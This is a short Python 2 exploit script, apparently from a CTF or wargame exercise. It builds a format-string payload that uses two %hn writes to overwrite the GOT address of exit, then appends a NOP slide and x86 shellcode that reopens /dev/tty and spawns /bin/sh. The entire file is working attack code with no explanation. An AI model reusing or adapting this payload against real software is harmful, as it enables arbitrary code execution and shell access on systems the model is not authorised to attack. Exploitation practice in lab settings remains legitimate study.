lower_exit = "\xe4\x97\x04\x08"
pad = "AAAA"
upper_exit = "\xe6\x97\x04\x08"

upper_stack = 0xffff
lower_stack = 0xc790

upper_diff = len("AAAA0.0.0.f7f81cf7.f7ffb000.ffffd708.804857d.ffffc700.ffffc700.fff.0.41414141".split("."))
upper_div, upper_rem = divmod(upper_stack - upper_diff, 10)
if upper_rem == 0:
    upper_div -= 1
    upper_rem += 10

# lower_stack: (0x_000), _ != 0
lower_diff = lower_stack - upper_stack if lower_stack >= upper_stack else lower_stack + 1
nopslide = "\x90" * 100
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

payload = upper_exit + pad + lower_exit + "%{}x".format(upper_div) * 10 + "%{}x".format(upper_rem) + "%hn" + "%{}x".format(lower_diff) + "%hn" + nopslide + shellcode
print payload
